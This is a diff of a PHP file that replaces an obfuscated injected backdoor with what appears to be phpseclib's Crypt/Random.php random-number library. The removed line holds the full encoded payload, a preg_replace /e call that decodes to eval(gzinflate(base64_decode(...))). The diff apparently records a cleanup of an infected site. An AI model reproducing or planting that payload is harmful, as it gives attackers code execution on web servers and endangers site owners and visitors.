@@ -1,3 +1,249 @@
 <?php
-preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B","");
-?>
+/* vim: set expandtab tabstop=4 shiftwidth=4 softtabstop=4: */
+
+/**
+ * Random Number Generator
+ *
+ * PHP versions 4 and 5
+ *
+ * Here's a short example of how to use this library:
+ * <code>
+ * <?php
+ *    include('Crypt/Random.php');
+ *
+ *    echo bin2hex(crypt_random_string(8));
+ * ?>
+ * </code>
+ *
+ * LICENSE: Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ * 
+ * The above copyright notice and this permission notice shall be included in
+ * all copies or substantial portions of the Software.
+ * 
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ * THE SOFTWARE.
+ *
+ * @category   Crypt
+ * @package    Crypt_Random
+ * @author     Jim Wigginton <terrafrost@php.net>
+ * @copyright  MMVII Jim Wigginton
+ * @license    http://www.opensource.org/licenses/mit-license.html  MIT License
+ * @link       http://phpseclib.sourceforge.net
+ */
+
+/**
+ * "Is Windows" test
+ *
+ * @access private
+ */
+define('CRYPT_RANDOM_IS_WINDOWS', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
+
+/**
+ * Generate a random string.
+ *
+ * Although microoptimizations are generally discouraged as they impair readability this function is ripe with
+ * microoptimizations because this function has the potential of being called a huge number of times.
+ * eg. for RSA key generation.
+ *
+ * @param Integer $length
+ * @return String
+ * @access public
+ */
+function crypt_random_string($length)
+{
+    if (CRYPT_RANDOM_IS_WINDOWS) {
+        // method 1. prior to PHP 5.3 this would call rand() on windows hence the function_exists('class_alias') call.
+        // ie. class_alias is a function that was introduced in PHP 5.3
+        if (function_exists('mcrypt_create_iv') && function_exists('class_alias')) {
+            return mcrypt_create_iv($length);
+        }
+        // method 2. openssl_random_pseudo_bytes was introduced in PHP 5.3.0 but prior to PHP 5.3.4 there was,
+        // to quote <http://php.net/ChangeLog-5.php#5.3.4>, "possible blocking behavior". as of 5.3.4
+        // openssl_random_pseudo_bytes and mcrypt_create_iv do the exact same thing on Windows. ie. they both
+        // call php_win32_get_random_bytes():
+        //
+        // https://github.com/php/php-src/blob/7014a0eb6d1611151a286c0ff4f2238f92c120d6/ext/openssl/openssl.c#L5008
+        // https://github.com/php/php-src/blob/7014a0eb6d1611151a286c0ff4f2238f92c120d6/ext/mcrypt/mcrypt.c#L1392
+        //
+        // php_win32_get_random_bytes() is defined thusly:
+        //
+        // https://github.com/php/php-src/blob/7014a0eb6d1611151a286c0ff4f2238f92c120d6/win32/winutil.c#L80
+        //
+        // we're calling it, all the same, in the off chance that the mcrypt extension is not available
+        if (function_exists('openssl_random_pseudo_bytes') && version_compare(PHP_VERSION, '5.3.4', '>=')) {
+            return openssl_random_pseudo_bytes($length);
+        }
+    } else {
+        // method 1. the fastest
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            return openssl_random_pseudo_bytes($length);
+        }
+        // method 2
+        static $fp = true;
+        if ($fp === true) {
+            // warning's will be output unles the error suppression operator is used. errors such as
+            // "open_basedir restriction in effect", "Permission denied", "No such file or directory", etc.
+            $fp = @fopen('/dev/urandom', 'rb');
+        }
+        if ($fp !== true && $fp !== false) { // surprisingly faster than !is_bool() or is_resource()
+            return fread($fp, $length);
+        }
+        // method 3. pretty much does the same thing as method 2 per the following url:
+        // https://github.com/php/php-src/blob/7014a0eb6d1611151a286c0ff4f2238f92c120d6/ext/mcrypt/mcrypt.c#L1391
+        // surprisingly slower than method 2. maybe that's because mcrypt_create_iv does a bunch of error checking that we're
+        // not doing. regardless, this'll only be called if this PHP script couldn't open /dev/urandom due to open_basedir
+        // restrictions or some such
+        if (function_exists('mcrypt_create_iv')) {
+            return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
+        }
+    }
+    // at this point we have no choice but to use a pure-PHP CSPRNG
+
+    // cascade entropy across multiple PHP instances by fixing the session and collecting all
+    // environmental variables, including the previous session data and the current session
+    // data.
+    //
+    // mt_rand seeds itself by looking at the PID and the time, both of which are (relatively)
+    // easy to guess at. linux uses mouse clicks, keyboard timings, etc, as entropy sources, but
+    // PHP isn't low level to be able to use those as sources and on a web server there's not likely
+    // going to be a ton of keyboard or mouse action. web servers do have one thing that we can use
+    // however. a ton of people visiting the website. obviously you don't want to base your seeding
+    // soley on parameters a potential attacker sends but (1) not everything in $_SERVER is controlled
+    // by the user and (2) this isn't just looking at the data sent by the current user - it's based
+    // on the data sent by all users. one user requests the page and a hash of their info is saved.
+    // another user visits the page and the serialization of their data is utilized along with the
+    // server envirnment stuff and a hash of the previous http request data (which itself utilizes
+    // a hash of the session data before that). certainly an attacker should be assumed to have
+    // full control over his own http requests. he, however, is not going to have control over
+    // everyone's http requests.
+    static $crypto = false, $v;
+    if ($crypto === false) {
+        // save old session data
+        $old_session_id = session_id();
+        $old_use_cookies = ini_get('session.use_cookies');
+        $old_session_cache_limiter = session_cache_limiter();
+        if (isset($_SESSION)) {
+            $_OLD_SESSION = $_SESSION;
+        }
+        if ($old_session_id != '') {
+            session_write_close();
+        }
+
+        session_id(1);
+        ini_set('session.use_cookies', 0);
+        session_cache_limiter('');
+        session_start();
+
+        $v = $seed = $_SESSION['seed'] = pack('H*', sha1(
+            serialize($_SERVER) .
+            serialize($_POST) .
+            serialize($_GET) .
+            serialize($_COOKIE) .
+            serialize($GLOBALS) .
+            serialize($_SESSION) .
+            serialize($_OLD_SESSION)
+        ));
+        if (!isset($_SESSION['count'])) {
+            $_SESSION['count'] = 0;
+        }
+        $_SESSION['count']++;
+
+        session_write_close();
+
+        // restore old session data
+        if ($old_session_id != '') {
+            session_id($old_session_id);
+            session_start();
+            ini_set('session.use_cookies', $old_use_cookies);
+            session_cache_limiter($old_session_cache_limiter);
+        } else {
+           if (isset($_OLD_SESSION)) {
+               $_SESSION = $_OLD_SESSION;
+               unset($_OLD_SESSION);
+            } else {
+                unset($_SESSION);
+            }
+        }
+
+        // in SSH2 a shared secret and an exchange hash are generated through the key exchange process.
+        // the IV client to server is the hash of that "nonce" with the letter A and for the encryption key it's the letter C.
+        // if the hash doesn't produce enough a key or an IV that's long enough concat successive hashes of the
+        // original hash and the current hash. we'll be emulating that. for more info see the following URL:
+        //
+        // http://tools.ietf.org/html/rfc4253#section-7.2
+        //
+        // see the is_string($crypto) part for an example of how to expand the keys
+        $key = pack('H*', sha1($seed . 'A'));
+        $iv = pack('H*', sha1($seed . 'C'));
+
+        // ciphers are used as per the nist.gov link below. also, see this link:
+        //
+        // http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator#Designs_based_on_cryptographic_primitives
+        switch (true) {
+            case class_exists('Crypt_AES'):
+                $crypto = new Crypt_AES(CRYPT_AES_MODE_CTR);
+                break;
+            case class_exists('Crypt_TripleDES'):
+                $crypto = new Crypt_TripleDES(CRYPT_DES_MODE_CTR);
+                break;
+            case class_exists('Crypt_DES'):
+                $crypto = new Crypt_DES(CRYPT_DES_MODE_CTR);
+                break;
+            case class_exists('Crypt_RC4'):
+                $crypto = new Crypt_RC4();
+                break;
+            default:
+                $crypto = $seed;
+                return crypt_random_string($length);
+        }
+
+        $crypto->setKey($key);
+        $crypto->setIV($iv);
+        $crypto->enableContinuousBuffer();
+    }
+
+    if (is_string($crypto)) {
+        // the following is based off of ANSI X9.31:
+        //
+        // http://csrc.nist.gov/groups/STM/cavp/documents/rng/931rngext.pdf
+        //
+        // OpenSSL uses that same standard for it's random numbers:
+        //
+        // http://www.opensource.apple.com/source/OpenSSL/OpenSSL-38/openssl/fips-1.0/rand/fips_rand.c
+        // (do a search for "ANS X9.31 A.2.4")
+        //
+        // ANSI X9.31 recommends ciphers be used and phpseclib does use them if they're available (see
+        // later on in the code) but if they're not we'll use sha1
+        $result = '';
+        while (strlen($result) < $length) { // each loop adds 20 bytes
+            // microtime() isn't packed as "densely" as it could be but then neither is that the idea.
+            // the idea is simply to ensure that each "block" has a unique element to it.
+            $i = pack('H*', sha1(microtime()));
+            $r = pack('H*', sha1($i ^ $v));
+            $v = pack('H*', sha1($r ^ $i));
+            $result.= $r;
+        }
+        return substr($result, 0, $length);
+    }
+
+    //return $crypto->encrypt(str_repeat("\0", $length));
+
+    $result = '';
+    while (strlen($result) < $length) {
+        $i = $crypto->encrypt(microtime());
+        $r = $crypto->encrypt($i ^ $v);
+        $v = $crypto->encrypt($r ^ $i);
+        $result.= $r;
+    }
+    return substr($result, 0, $length);
+}
